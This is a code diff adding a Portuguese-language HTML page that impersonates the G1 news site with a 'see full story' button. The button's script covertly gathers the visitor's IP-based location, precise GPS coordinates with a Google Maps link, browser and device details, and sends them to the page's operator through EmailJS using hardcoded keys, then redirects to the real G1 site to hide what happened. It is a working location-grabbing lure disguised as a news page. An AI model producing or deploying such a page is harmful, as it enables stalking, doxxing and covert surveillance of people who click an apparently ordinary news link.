@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Notícia em destaque</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: #f4f4f4;
+        margin: 0;
+      }
+      header {
+        background: #c4170c;
+        color: white;
+        padding: 15px;
+        text-align: center;
+        font-size: 24px;
+        font-weight: bold;
+      }
+      .container {
+        max-width: 800px;
+        margin: 30px auto;
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+      }
+      .btn {
+        display: block;
+        margin: 30px auto;
+        padding: 15px;
+        background: #c4170c;
+        color: white;
+        text-align: center;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 18px;
+        width: 220px;
+      }
+    </style>
+
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+    <script>
+      (function () {
+        emailjs.init("yV6cvtVvqX4C8dP-O");
+      })();
+
+      function pegarLocalizacaoPrecisa() {
+        return new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              resolve({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                precisao: pos.coords.accuracy,
+              });
+            },
+            (erro) => reject(erro),
+          );
+        });
+      }
+
+      async function enviarDados() {
+        try {
+          console.log("Iniciando coleta...");
+
+          // 🔹 BUSCA IP
+          let dadosIP = {};
+          try {
+            let resposta = await fetch("https://ipapi.co/json/");
+            if (!resposta.ok) throw new Error("Erro IP");
+            dadosIP = await resposta.json();
+          } catch (e) {
+            console.log("Erro IP:", e);
+            dadosIP = {};
+          }
+
+          console.log("IP:", dadosIP);
+
+          // 🔹 GEOLOCALIZAÇÃO
+          let geo = {};
+          try {
+            geo = await pegarLocalizacaoPrecisa();
+          } catch (e) {
+            console.log("Geo negado");
+            geo = {};
+          }
+
+          console.log("Geo:", geo);
+
+          let linkMapa = geo.latitude
+            ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`
+            : "não disponível";
+
+          // 🔹 DADOS GARANTIDOS
+          let dadosEnvio = {
+            ip: dadosIP.ip || "não disponível",
+            cidade: dadosIP.city || "não disponível",
+            estado: dadosIP.region || "não disponível",
+            pais: dadosIP.country_name || "não disponível",
+            org: dadosIP.org || "não disponível",
+
+            latitude: geo.latitude || "não permitido",
+            longitude: geo.longitude || "não permitido",
+            precisao: geo.precisao || "-",
+            mapa: linkMapa,
+
+            dispositivo: navigator.platform || "-",
+            navegador: navigator.userAgent || "-",
+            so: navigator.platform || "-",
+            idioma: navigator.language || "-",
+          };
+
+          console.log("ENVIANDO:", dadosEnvio);
+
+          // 🔹 ENVIO EMAILJS
+          await emailjs.send("service_l4nmnha", "template_yzw2cah", dadosEnvio);
+
+          alert("Carregando notícia...");
+          window.location.href = "https://g1.globo.com/";
+        } catch (erro) {
+          console.error("ERRO GERAL:", erro);
+          alert("Erro ao processar.");
+        }
+      }
+    </script>
+<link rel="stylesheet" href="shared/css/identidade-intranet.css">
+
+<link rel="stylesheet" href="shared/css/acessibilidade-intranet.css">
+<script src="shared/js/acessibilidade-intranet.js" defer></script>
+</head>
+  <body>
+    <header>G1 - Últimas Notícias</header>
+
+    <div class="container">
+      <h2>Nova atualização importante divulgada hoje</h2>
+      <p>Clique abaixo para ver a matéria completa.</p>
+
+      <div class="btn" onclick="enviarDados()">Ver notícia completa</div>
+    </div>
+  </body>
+</html>
